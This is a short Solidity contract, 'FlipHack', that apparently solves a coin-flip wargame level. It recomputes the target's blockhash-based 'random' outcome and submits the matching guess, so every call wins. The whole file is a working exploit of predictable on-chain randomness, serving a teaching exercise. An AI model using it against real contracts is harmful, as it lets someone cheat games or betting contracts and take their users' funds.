//SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
interface FlipContract{
    function flip(bool _guess) external returns (bool);
}

contract FlipHack {
    FlipContract flipper;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    constructor(address _flipaddr){
        flipper = FlipContract(_flipaddr);
    }

    function hack() public returns (bool){
        uint256 blockvalue = uint256(blockhash(block.number -1 ));
        uint256 flip = blockvalue/FACTOR;
        bool side = flip == 1? true: false;
        bool ret = flipper.flip(side);
        return ret;
    }
}